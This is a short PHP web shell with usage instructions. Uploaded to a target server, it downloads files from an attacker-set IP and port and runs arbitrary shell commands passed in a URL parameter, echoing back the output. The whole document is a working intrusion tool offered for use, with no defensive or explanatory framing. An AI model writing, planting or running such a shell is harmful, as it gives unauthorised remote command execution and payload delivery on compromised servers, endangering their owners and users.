/*
Requirements: 1. Need to change the IP and PORT values in the first IF statement to function. 2. Load this PHP file to the server and navigate to it over HTTP.
Usage: http://[target IP]:[port]/[directory]/PHP_fUpload_fExec.php?fupload=[file location for upload]&fexec=[command or EXE to execute - include double quotes around command to prevent issues]
*/
<?php
  if (isset($_REQUEST['fupload'])) {
    file_put_contents($_REQUEST['fupload'], file_get_contents("http://IP:PORT/" . $_REQUEST['fupload']));
  };
  if (isset($_REQUEST['fexec'])) {
    echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
  };
?>
